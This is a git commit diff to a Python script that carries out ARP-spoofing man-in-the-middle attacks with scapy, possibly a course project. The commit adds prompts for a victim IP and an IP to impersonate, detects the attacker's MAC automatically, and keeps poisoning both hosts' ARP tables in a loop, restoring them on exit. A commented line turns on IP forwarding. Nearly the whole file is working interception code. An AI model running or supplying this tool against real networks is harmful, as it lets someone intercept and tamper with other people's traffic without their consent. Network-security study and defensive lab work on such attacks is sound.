588f1344c3332075e27e1ddf93577f16b166c841
professor-oats <chronophob@gmail.com>
2024-11-02 01:07:17 +0100

    better functionality and more verbose

--- Project1/PacketPapi/mitm_arp.py
+++ Project1/PacketPapi/mitm_arp.py
@@ -1,21 +1,22 @@
-from scapy.layers.l2 import ARP, getmacbyip, Ether
-from scapy.all import sendp
+from scapy.layers.l2 import ARP, Ether, getmacbyip, get_if_hwaddr
+from scapy.all import sendp, conf
 import os
 import time
+import ipaddress
 
-
-victim_ip = "192.168.10.235"
-victim_mac = getmacbyip(victim_ip)
-spoofed_ip_origin = "192.168.10.1"
-spoofed_mac_origin = getmacbyip(spoofed_ip_origin)
-
-
-attacker_mac = "ff:ff:ff:ff:ff:ff"  # Replace with your machine's MAC address
 
 # Ensure that you have IP forwarding on the attacker machine (Linux example)
 # os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
 
-def spoof_arp(target_ip, target_mac, spoof_ip):
+# Just a check to see if the IP is correctly formatted
+def is_valid_ip(target):
+  try:
+    ipaddress.ip_address(target)
+    return True
+  except ValueError:
+    return False
+
+def spoof_arp(target_ip, target_mac, spoof_ip, attacker_mac):
   # Send an ARP reply to `target_ip`, telling it that `spoof_ip`
   # is associated with the attacker's MAC address.
   # Using broadcast
@@ -28,7 +29,7 @@ def spoof_arp(target_ip, target_mac, spoof_ip):
   packet = ether / arp
   sendp(packet, verbose=False)
 
-def restore_arp(target_ip, target_mac, source_ip, source_mac):
+def restore_arp(target_ip, target_mac, source_ip, source_mac, attacker_mac):
   # Restore the ARP table for `target_ip`, telling it that `source_ip`
   # is associated with `source_mac`.
 
@@ -39,18 +40,36 @@ def restore_arp(target_ip, target_mac, source_ip, source_mac):
 
 def main():
 
-  print("Starting ARP spoofing...")
+  while True:
+    victim_ip = input("Declare the IP of the victim you want to target:\n")
+    if is_valid_ip(victim_ip):
+      break
+    print("Wrong IP format")
+
+  victim_mac = getmacbyip(victim_ip)
+
+  while True:
+    spoofed_ip_origin = input("Declare the IP of the target want to spoof as:\n")
+    if is_valid_ip(spoofed_ip_origin):
+      break
+    print("Wrong IP format")
+
+  spoofed_mac_origin = getmacbyip(spoofed_ip_origin)
+
+  attacker_mac = get_if_hwaddr(conf.iface)  # Replace with your machine's MAC address
+
+  print(f"Starting ARP spoofing as {spoofed_ip_origin} for victim {victim_ip}...")
   try:
     while True:
       # Tell the victim that the spoofed IP is at the attacker's MAC
-      spoof_arp(victim_ip, victim_mac, spoofed_ip_origin)
+      spoof_arp(victim_ip, victim_mac, spoofed_ip_origin, attacker_mac)
       # Tell the machine we spoof that the victim is at the attacker's MAC
-      spoof_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip)
+      spoof_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, attacker_mac)
       time.sleep(2)  # Repeat every 2 seconds to maintain the MITM position
   except KeyboardInterrupt:
     print("Stopping ARP spoofing and restoring ARP tables...")
-    restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin)  # Original spoofed_mac_here
-    restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac)   # Original victim_mac_here
+    restore_arp(victim_ip, victim_mac, spoofed_ip_origin, spoofed_mac_origin, attacker_mac)  # Original spoofed_mac_here
+    restore_arp(spoofed_ip_origin, spoofed_mac_origin, victim_ip, victim_mac, attacker_mac)   # Original victim_mac_here
 
 if __name__ == "__main__":
   main()
